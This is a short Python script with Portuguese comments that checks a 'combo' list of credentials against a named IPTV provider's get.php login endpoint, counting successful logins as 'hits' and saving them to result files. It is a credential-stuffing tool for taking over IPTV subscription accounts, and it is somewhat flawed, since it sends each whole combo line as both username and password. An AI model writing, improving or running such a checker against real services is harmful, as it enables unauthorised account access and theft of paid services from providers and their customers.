import requests

def buscar_combinacoes(arquivo_combo, provedores, arquivo_resultados):
    hits = 0
    with open(arquivo_combo, 'r') as combo_file:
        combos = combo_file.readlines()
    
    with open(arquivo_resultados, 'a') as resultados_file:
        for provedor in provedores:
            for combo in combos:
                username = combo.strip()
                password = combo.strip()  # Estou assumindo que a senha é a mesma que o usuário para a formatação de exemplo.
                url = f"{provedor}/get.php?username={username}&password={password}&type=m3u_plus"
                response = requests.get(url)
                if response.ok:
                    hits += 1
                    resultados_file.write(f"Combinação encontrada para {provedor}: {combo}\n")
    
    return hits

def main():
    provedores = [
        "http://7online.xyz"
    ]
    
    contador = 1
    while True:
        arquivo_combo = input("Por favor, insira o caminho do arquivo combo.txt: ")
        arquivo_resultados = f"resultados_{contador}.txt"
        hits = buscar_combinacoes(arquivo_combo, provedores, arquivo_resultados)
        print(f"Processo concluído. Os resultados foram salvos em {arquivo_resultados}.")
        print(f"Total de 'hits': {hits}")
        contador += 1

if __name__ == "__main__":
    main()
